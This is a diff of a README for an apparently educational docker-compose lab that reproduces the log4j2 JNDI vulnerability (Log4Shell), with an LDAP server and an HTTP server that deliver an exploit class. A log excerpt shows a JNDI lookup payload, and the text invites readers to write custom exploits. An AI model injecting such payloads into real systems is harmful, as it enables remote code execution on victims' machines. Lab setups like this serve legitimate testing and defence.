@@ -5,15 +5,16 @@ This vulnerability is extremely easy to exploit, and was fixed in log4j2 version
 This repository goal is to automate and construct the environment through a single click by using `docker-compose` and containers.
 This could be useful for:
 
-- Testing difference java version easily.
-- Testing different payloads without heavy setup.
+- Testing different java version easily.
+- Testing different payloads without constructing heavy setups.
 - Capturing easily the traffic for security protection measures.
+- More.
 
 The setup contains:
 
-- `vuln` - vulnarable code using log4j2
+- `vuln` - A vulnarable code using log4j2
 - `marshalsec` - An LDAP server serving the exploit to log4j JDNI request
-- `httpserver` - A simple python server serving the compiled exploit java class file
+- `http-server` - A simple python server serving the compiled exploit java class file
 
 Further explanation cab be reached here:
 https://www.lunasec.io/docs/blog/log4j-zero-day/
@@ -35,7 +36,7 @@ vuln_1         | 17:26:26.531 [main] ERROR log4j - ${jndi:ldap://marshalsec:1389
 ```
 
 Behind the scenes, the vulnerable code is requesting the `Exploit` class from the LDAP server, and executes it.
-You can freely modify the `exploit/Exploit.java` file to make custom exploits.
+You can freely modify the [Exploit](exploit/Exploit.java) file to make custom exploits, or the [log4j](vuln/src/main/java/log4j.java) file to change the malicious log.
 
 ## Notes
 
